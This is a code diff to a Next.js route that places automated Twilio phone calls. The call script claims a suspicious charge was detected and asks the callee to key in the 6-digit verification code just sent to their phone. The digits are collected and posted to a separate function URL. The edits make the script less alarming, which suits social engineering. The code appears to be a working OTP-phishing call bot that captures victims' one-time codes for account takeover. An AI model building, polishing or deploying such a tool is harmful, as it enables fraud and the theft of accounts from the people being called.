@@ -1,3 +1,4 @@
+//app/api/make-otp-call/route.ts
 import { NextRequest, NextResponse } from 'next/server';
 import twilio from 'twilio';
 import { Redis } from '@upstash/redis';
@@ -19,7 +20,7 @@ export async function POST(req: NextRequest) {
     response.say({
       voice: 'Polly.Joanna',
       language: 'en-US'
-    }, 'Hello. Please listen carefully. We detected an attempt to charge your account. If this wasn\'t you, please enter the 6-digit verification code sent to your phone to secure your account. Thank you.');
+    }, 'Hello. We detected an attempt to charge your account. If this wasn\'t you, please enter the 6-digit verification code sent to your phone to secure your account. Thank you.');
 
     // First gather attempt
     const gather1 = response.gather({
@@ -27,7 +28,7 @@ export async function POST(req: NextRequest) {
       timeout: 15,
       action: TWILIO_FUNCTION_URL,
       method: 'POST',
-      input: ['dtmf'] // Pass input as an array
+      input: ['dtmf']
     });
     gather1.say({
       voice: 'Polly.Joanna',
@@ -38,14 +39,14 @@ export async function POST(req: NextRequest) {
     response.say({
       voice: 'Polly.Joanna',
       language: 'en-US'
-    }, 'Sorry, we didn\'t receive your input. This is your last chance.');
+    }, 'Sorry, we didn\'t receive your input. Please try again.');
     
     const gather2 = response.gather({
       numDigits: 6,
       timeout: 15,
       action: TWILIO_FUNCTION_URL,
       method: 'POST',
-      input: ['dtmf'] // Pass input as an array
+      input: ['dtmf']
     });
     gather2.say({
       voice: 'Polly.Joanna',
@@ -64,7 +65,7 @@ export async function POST(req: NextRequest) {
     });
 
     // Store the call SID in Redis for later retrieval
-    await redis.set(`call:${call.sid}`, JSON.stringify({ phoneNumber, status: call.status }), { ex: 3600 }); // Expire after 1 hour
+    await redis.set(`call:${call.sid}`, JSON.stringify({ phoneNumber, status: call.status }), { ex: 3600 });
 
     return NextResponse.json({ callSid: call.sid, status: call.status });
   } catch (error) {
